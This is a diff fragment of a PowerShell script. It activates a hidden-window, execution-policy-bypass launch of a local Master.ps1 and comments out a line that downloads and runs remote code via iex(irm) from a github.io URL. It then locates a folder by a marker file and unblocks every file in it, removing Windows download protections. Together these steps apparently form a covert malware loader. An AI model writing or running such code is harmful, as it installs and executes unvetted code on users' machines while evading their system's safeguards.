@@ -99,8 +99,8 @@ try {
         $shortcut.Save()
     }
 
-    #Start-Process powershell.exe -ArgumentList "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`""
-    start-process powershell.exe -ArgumentList "-NoLogo -NoProfile iex(irm https://nature-cursive.github.io/AI/nothing.txt)"
+    Start-Process powershell.exe -ArgumentList "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`""
+    #start-process powershell.exe -ArgumentList "-NoLogo -NoProfile iex(irm https://nature-cursive.github.io/AI/nothing.txt)"
 
     $unzipDir = Get-ChildItem -Path $env:USERPROFILE -Recurse -Filter "ai_research_8973479hdfj674.txt" | Select-Object -ExpandProperty DirectoryName
     Get-ChildItem -Path $unzipDir -Recurse -File | Unblock-File -ErrorAction SilentlyContinue
